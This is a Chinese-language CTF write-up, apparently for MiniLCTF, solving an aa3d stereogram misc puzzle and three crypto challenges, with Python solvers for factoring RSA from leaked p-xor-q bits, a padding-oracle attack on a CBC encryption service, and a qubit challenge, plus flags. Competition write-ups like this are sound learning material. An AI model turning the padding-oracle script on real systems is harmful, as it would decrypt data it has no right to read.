打开一个文件 flag.txt，里面有很多很多数字..一开始看很有特点都是循环的，但是无果....转成二进制 看 转成十六进制看 都没办法 直接long_to_bytes，没东西...
甚至还想用XCTF 3rd-RCTF-2017的二进制形式去查看这道题...emmm还是没找到办法，都没用...
之后给了hint ： `你看过阿凡达吗?`
找了很多很多，甚至思路去开始想...DNA基因Recombination相关的内容，还查了DNA基因库...无果...
然后又给了个hint：`3D`  
找了很久才知道有 `aa3d` 这个考点...甚至是我们拿了rank17的DasCTF的三月赛.离谱阿.没复现过.
找到这个writeup https://blog.csdn.net/mochu7777777/article/details/115276176
看下去发现有aa3d的东西，但是他也是一组数.去了官网下了东西，但是没看懂，继续看发现他是把数字进行反色之后位移就能出东西..试一下..生成一组数之后发现前面都是相同的对的上的
长度是 4459 = 47 \* 97 ，那就去格式一下，截个图。 然后去用stegosolve偏移图层发现flag出来了。一开始是比较不清晰的 问了Ga1@xy 之后说还不是最清晰的，让我在调调，在多调一下最后得到的是

![](https://md.wanan.world/uploads/upload_225d88303a00c4d01853fcf85ae00f8a.png)

flag:`MiniL{A@3d-1s_Ar7!!}`

# **Crypto:**

## asr | dbt | done

高低位一起dfs
(shallow之前的脚本拉出来改的 ... 应该不会被发现吧 ...x
``` python
from Crypto.Util.number import*

def get_flag():
    phi = (p-1)*(q-1)
    d =inverse(e,phi)
    return long_to_bytes(pow(c,d,n))

def get_p_q():
    p_low = [0]
    q_high = [0]
    q_low = [0]
    p_high = [0]
    maskx = 1
    maskn = 2
    si = 2
    for i in range(256):
        x_lowbits = (x & maskx) >> i
        n_lowbits = (n % maskn)
        tmppp_low = []
        tmpqq_low = []
        tmppp_high =[]
        tmpqq_high =[]
        x_highbits = (x >> (511-i)) & 1
        n_highbits = (n)>> (1022 - 2*i)
        for j in range(len(p_low)):
            for pp_low in range(2):
                for qq_low in range(2):
                    for pp_high in range(2):
                        for qq_high in range(2):
                            if pp_low ^ qq_high == x_lowbits and qq_low ^ pp_high == x_highbits:
                                temp1 = ((pp_low * maskn //2 + p_low[j]) * (qq_low * maskn // 2 + q_low[j])) % maskn 
                                temp2 = (((pp_high << (511-i)) + p_high[j]) * ((qq_high << (511-i)) + q_high[j]))>>(1022-2*i)
                                if temp1 == n_lowbits :
                                    if n_highbits-temp2 >= 0  and n_highbits-temp2 <=(2<<i+1):
                                        #print("down")
                                        tmppp_low.append(pp_low * maskn //2 + p_low[j])
                                        tmpqq_low.append(qq_low * maskn //2 + q_low[j])
                                        tmppp_high.append((pp_high<<(511-i))+p_high[j])
                                        tmpqq_high.append((qq_high<<(511-i))+q_high[j])
                                        #print(tmppp_low)
                                        #print(tmpqq_low)
                                        #print(tmppp_high)
                                        #print(tmpqq_high)
        maskn *= 2
        maskx *= 2
        p_low = tmppp_low
        q_low = tmpqq_low
        p_high = tmppp_high
        q_high = tmpqq_high
        print(i,len(p_low))
    for a in p_low:
        for b in p_high:
            if n %(a+b) ==0:
                p = a + b
                print(p)
                q = n//p
                return p,q

if __name__ == "__main__":
    n = 142640215238537871365683719891541306935180737226071087966538112975312943506714964164341655541156886519552359173518384366335764339838818638439617545046906731685628758140658162759582216079833807742803333237267119228131836589616600586722503125595590784393805677472708123448256012705645099262323873911736910168311
    c = 141992115210477059329798383810995602331919683555539663737474122431362785313684902184569357178889736223104558359787247242121836892146092641430333220915928891299001128364434856756544237628623127350186698031711524123158225428351095110283324920060240308834304841350657100420648385312630518518518978998617676378512
    e = 0x10001
    x = 2687108833541074884027968939992825896836389810177573543799115292760866858835988113613745599976930175463756036625174575759254321939315015594803646458939874 
    p , q = get_p_q()
    flag = get_flag()
    print(flag)
```

flag:`miniLCTF{reverse_1s_als0_e1sy_for_hs}`


## standard cbc | dbt | done
原来那道题...想的是用base64去爆破大概的每位是啥...但是发现出的是32位哈希值 没法爆破，浪费了好一会时间...
Padding Oracle...细节真难调...
```python
from pwn import *
from base64 import b64decode, b64encode
from Crypto.Util.number import long_to_bytes

def get_least_length():
    for i in range(1, 16):
        guess = b'\x00' * i
        c = b64decode(get_recv(guess))
        if i == 1:
            base = len(c)
        if len(c) != base:
            return base - 16 - i

def get_recv(x):
    io.send(b'1')
    io.recvuntil(b':')
    io.send(b64encode(x))
    Res = io.recvuntil(b'flag;').decode().split('\n')
    return Res[1]

def get_message_last(c):
    guess = long_to_bytes(66) * 239
    for i in range(256):
        G = guess + long_to_bytes(i)
        io.send(b'2')
        io.recvuntil(b':')
        io.send(b64encode(G + c))
        io.recvuntil(b':')
        io.send(b64encode(IV))
        resp = io.recvuntil('flag;').decode().split('\n')[1]
        if resp == '':
            return i

if __name__ == "__main__":
    IV = b'\x00'*16
    LengTh = 0
    ciphertext = []
    M = [0]*17
    while LengTh == None or LengTh != 17:
        try:
            io = remote('0.0.0.0', 10001)
            io.recv()
            LengTh = get_least_length()
            print(LengTh)
        except:
            io.close()
    print('Get Length!!!')
    for i in range(16):
        pad = b'\x76' * 16 + (15 - i) * b'\x00'
        res = get_recv(pad)
        ciphertext.append(b64decode(res))
    print('Get Ciphertext!!!')
    i = 0
    for c in ciphertext:
        print(i)
        if i == 0:
            c16 = c[48:64]
            M[-1] = long_to_bytes(get_message_last(c16) ^ c[47])
        c16 = c[32:48]
        M[i] = long_to_bytes(get_message_last(c16) ^ c[31])
        i += 1
    m = b''.join(M)
    print('Get Message!!!')
    io.recv()
    io.send(b'3')
    print(io.recv())
    io.send(b64encode(m))
    print(io.recv())
    print(io.recv())
```


## 土 块 | dbt | done
qubits.....量子计算学习....量子通信~ https://qiskit.org/textbook/preface.html  想了好久好久...看了好多知乎文章不如官方文档来的实在..就去熟悉内容吧...脑子糊了好久，都没想到这个 翻官方文档 复制让01输出01，10输出10 巧！台尼玛巧了！ 在和槐师傅去西电附中路上想出来的，果然不能一直对着电脑！学了好多东西...不知道能记得多少...确实挺有意思的...
```python
from pwn import*
Rec = lambda  :p.recv()
Sen = lambda x:p.sendline(x)
RecUntil = lambda x:p.recvuntil(x)
def RecSen(x):
    Rec()
    Sen(x)
if __name__ =="__main__":
    p = remote("pwn.woooo.tech",10185)
    RecSen("lubenwei")
    RecSen("9")
    RecSen("1 0")
    RecSen("9")
    RecSen("0 1")
    Sen("0")
    for  i  in  range(42):
        RecUntil("is ")
        num = (p.recv(1))
        RecSen(str(int(num.decode())))
    p.recvline()
    p.recvline()
    print(p.recvline()[:-1])
```